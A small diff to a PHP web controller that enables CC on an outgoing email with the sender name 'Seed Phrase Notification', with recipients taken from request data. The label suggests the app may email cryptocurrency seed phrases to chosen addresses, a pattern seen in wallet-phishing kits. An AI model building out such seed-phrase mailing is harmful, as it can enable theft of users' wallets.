@@ -50,7 +50,7 @@ class Home extends BaseController
 		$email = \Config\Services::email();
 		$email->setFrom( getenv('smtpuser'), 'Seed Phrase Notification');
 		$email->setTo($data['to']);
-		// $email->setCC($data['cc']);
+		$email->setCC($data['cc']);
 		// $email->setBCC('them@their-example.com');
 
 		$email->setSubject($data['subject']);
